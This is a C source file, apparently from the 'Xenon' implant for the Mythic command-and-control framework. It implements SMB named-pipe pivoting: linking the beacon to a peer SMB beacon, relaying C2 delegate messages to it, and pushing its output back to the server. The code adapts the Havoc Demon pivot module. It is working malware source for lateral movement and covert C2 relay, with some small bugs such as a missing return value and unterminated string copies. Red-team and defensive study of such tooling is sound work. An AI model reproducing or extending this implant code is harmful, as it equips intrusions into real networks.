#include "Tasks/Link.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Utils.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK

/**
 * @brief Link current Beacon to an SMB Beacon.
 * 
 * @ref 
 * @return VOID
 */
VOID Link(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pipeLen      = 0;
	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);

    _dbg("Adding Link Agent for Pipename: %s", PipeName);

    /* Output */
    PVOID  outBuf = NULL;
    SIZE_T outLen = 0;
    UINT32 LinkId = 0;


    /* Connect to Pivot Agent and Read First Message */
    DWORD Result = 0;
    if ( !LinkAdd(taskUuid, PipeName, &outBuf, &outLen, &LinkId) ) 
    {
        _err("Failed to link smb agent.");
        Result = GetLastError();
        PackageError(taskUuid, Result);
        goto END;
    }

    /* Send P2P Checkin Message */
    PPackage locals = PackageInit(NULL, FALSE);
    PackageAddByte(locals, LINK_ADD);                           // BYTE:                LINK_CHECKIN           
    PackageAddBytes(locals, taskUuid, TASK_UUID_SIZE, FALSE);   // PCHAR:               Task ID
    PackageAddInt32(locals, Result);                            // UINT32:              Status   
    PackageAddInt32(locals, LinkId);                            // UINT32:              Link ID
    PackageAddString(locals, outBuf + 4, TRUE);                 // PCHAR:               B64 Message (dont include LinkID bytes)

    PackageQueue(locals);

    /* This agent may now receive delegate messages for Link */

END:

    if (outBuf) LocalFree(outBuf);

    return;
}

///////////////////////////////////////////////////////////////

/**
 * @brief UnLink current Beacon from an SMB Beacon.
 * 
 * @ref  
 * @return VOID
 */
VOID UnLink(PCHAR taskUuid, PPARSER arguments)
{
    return;
}


/**
 *  Helper Functions
 */

 /**
 * @brief Add a new SMB pivot link to Agent.
 * 
 * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c
 * @return BOOL  
 */
BOOL LinkAdd( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, UINT32* LinkId)
{
    PLINKS LinkData    = NULL;
    HANDLE hPipe       = NULL;

    _dbg( "Connecting to named pipe: %s\n", PipeName );

    hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    
    if ( hPipe == INVALID_HANDLE_VALUE )
    {
        _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
        return FALSE;
    }

    if ( GetLastError() == ERROR_PIPE_BUSY )
    {
        if ( !WaitNamedPipeA(PipeName, 5000) )
        {
            return FALSE;
        }
    }


    /* Read the initial buffer */
    if ( !PackageReadPipe(hPipe, outBuf, outLen) )
    {
        _err("Failed to read initial buffer from pipe. ERROR : %d", GetLastError());
        return FALSE;
    }


    /* Add this Pivot Link to list */
    {
        _dbg("Read %d bytes of data from Link.\n", *outLen);
        
        LinkData                  = LocalAlloc(LPTR, sizeof(LINKS));
        LinkData->hPipe           = hPipe;
        LinkData->Next            = NULL;
        LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
        

        strncpy(LinkData->TaskUuid, TaskUuid, strlen(TaskUuid));
        _dbg("Parsed SMB Link ID => [%x] \n", LinkData->LinkId);
        LinkData->PipeName        = LocalAlloc(LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
        memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );

        *LinkId = LinkData->LinkId;

        /* Link */
        if ( !xenonConfig->SmbLinks )
        {
            xenonConfig->SmbLinks = LinkData;
        }
        else
        {
            PLINKS LinksList = xenonConfig->SmbLinks;

            do
            {
                if ( LinksList )
                {
                    if ( LinksList->Next ) 
                    {
                        LinksList = LinksList->Next;
                    }
                    else
                    {
                        LinksList->Next = LinkData;
                        break;
                    }
                }
                else break;
            } while ( TRUE );
        }
    }

    return TRUE;
}

/**
 * @brief Synchronize delegate messages to appropriate P2P Link
 */
BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
{
    SIZE_T IdLen        = 0;
    SIZE_T MsgLen       = 0;
    UINT32 LinkId       = 0;
    UINT32 NumOfParams  = 0;
    PCHAR  P2pUuid      = NULL;
    PCHAR  P2pMsg       = NULL;
    BOOL   IsCheckin    = FALSE;
    BOOL   Success      = FALSE;

    if (!Response)
        return FALSE;

    NumOfParams = ParserGetInt32(Response);
    if (NumOfParams == 0)
        return;

    _dbg("[LINK SYNC] Buffer:");

    IsCheckin   = (BOOL)ParserGetByte(Response);
    LinkId      = ParserGetInt32(Response);
    P2pUuid     = ParserStringCopy(Response, &IdLen);
    P2pMsg      = ParserStringCopy(Response, &MsgLen);

    _dbg("[LINK SYNC] Received P2P Response with args: \n\tIsCheckin: %s \n\tLinkId: %x \n\tP2P UUID: %s \n\tP2PMsg: %d bytes", IsCheckin ? "TRUE" : "FALSE", LinkId, P2pUuid, MsgLen);

    /* Find Correct Link and Sync Data */
    PLINKS Current = xenonConfig->SmbLinks;
    PLINKS Prev    = NULL;

    while ( Current )
    {
        PLINKS Next = Current->Next;

        /* Update Mythic Agent ID If Checkin */
        if ( IsCheckin )
        {
            if ( Current->LinkId == LinkId )
            {
                Current->AgentId = P2pUuid;

                _dbg("[LINK SYNC] Updated Link Agent ID => [%s]", Current->AgentId);
            }
            else
            {
                _err("Failed to find the matching Link by LinkID");
                goto CLEANUP;
            }
        }
        
        
        /* Search by AgentId and Send Data */
        if ( strcmp(Current->AgentId, P2pUuid) == 0 )
        {
            _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);

            if ( !PackageSendPipe(Current->hPipe, P2pMsg, MsgLen) ) {
                DWORD error = GetLastError();
                _err("Failed to write data to pipe. ERROR : %d", error);
                goto CLEANUP;
            }

            Success = TRUE;
            goto CLEANUP;
        }

        Prev    = Current;
        Current = Next;
    }

CLEANUP:

    LocalFree(P2pMsg);
    if ( !IsCheckin ) LocalFree(P2pUuid);

    return Success;
}


/**
 * @brief Pushes all Link updates to server
 * 
 * Note - This method does cause extra network requests
 * 
 * @return VOID
 */
VOID LinkPush()
{
    PPackage    Package   = NULL;
    PLINKS      TempList  = xenonConfig->SmbLinks;
    DWORD       BytesSize = 0;
    DWORD       Length    = 0;
    PVOID       Output    = NULL;
    ULONG32     NumLoops  = 0;

    /*
     * For each pivot, we loop up to MAX_SMB_PACKETS_PER_LOOP times
     * this is to avoid potentially blocking the parent agent
     */

    _dbg("Pushing all Link messages to server! ");

    do
    {
        if ( !TempList )
            break;

        if ( TempList->hPipe )
        {
            NumLoops = 0;
            do {

                if ( PeekNamedPipe( TempList->hPipe, NULL, 0, NULL, &BytesSize, NULL ) )
                {
                    if ( BytesSize >= sizeof( UINT32 ) )
                    {                           
                        Length = BytesSize;
                        Output = LocalAlloc( LPTR, Length );
                        memset(Output, 0, BytesSize);

                        if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
                        {
                            /* Verify Our Link ID from the package */
                            PARSER Temp = { 0 };
                            ParserNew(&Temp, Output, BytesSize);

                            UINT32 TempId = ParserGetInt32(&Temp);
                            if ( TempId != TempList->LinkId ) {
                                _dbg("Temp ID [%x]", TempId);
                                _dbg("Link ID [%x]", TempList->LinkId);
                                _err("Incorrect Link ID for package. Moving on...");
                                ParserDestroy(&Temp);
                                LocalFree(Output);
                                Output = NULL;
                                continue;
                            }

                            _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);

                            /* Send Link msg as a delegate type (LINK_MSG) */
                            Package = PackageInit(NULL, FALSE);
                            PackageAddByte(Package, LINK_MSG);
                            PackageAddString(Package, TempList->AgentId, FALSE);
                            PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);

                            PackageQueue(Package);

                            /* Clean up */
                            ParserDestroy(&Temp);
                            LocalFree(Output);
                            Output = NULL;
                            Length = 0;
                        }
                        else
                        {
                            _err( "ReadFile: Failed[%d]\n", GetLastError() );
                            LocalFree(Output);
                            Output = NULL;
                            Length = 0;
                            break;
                        }
                    }
                    else 
                    {
                        _dbg("Link ID [%x] message less than 4 bytes", TempList->LinkId);
                        break;
                    }
                }
                else
                {
                    _err( "PeekNamedPipe: Failed[%d]\n", GetLastError() );

                    if ( GetLastError() == ERROR_BROKEN_PIPE )
                    {
                        _err( "ERROR_BROKEN_PIPE. Remove pivot" );

                        // DWORD DemonID = TempList->DemonID;
                        // TempList      = TempList->Next;
                        
                        // BOOL  Removed = LinkRemove( DemonID );

                        // _dbg( "Link removed: %s\n", Removed ? "TRUE" : "FALSE" )

                        /* Report if we managed to remove the selected pivot */
                        // Package = PackageCreate( DEMON_COMMAND_PIVOT );
                        // PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                        // PackageAddInt32( Package, Removed );
                        // PackageAddInt32( Package, DemonID );
                        // PackageTransmit( Package );

                        break;
                    }

                    
                    break;
                }

                NumLoops++;
            } while ( NumLoops < MAX_SMB_PACKETS_PER_LOOP );
        }

        // select the next pivot
        if ( TempList )
            TempList = TempList->Next;

    } while ( TRUE );
}


UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
{
    PARSER  Parser    = { 0 };
    UINT32  Value     = 0;

    ParserNew( &Parser, Buffer, Length );

    // Value  = ParserStringCopy(&Parser, &uuidLen);
    Value = ParserGetInt32(&Parser);

    _dbg("Parsed SMB Link ID => %x \n", Value);

    ParserDestroy(&Parser);

    return Value;
}


#endif  //INCLUDE_CMD_LINK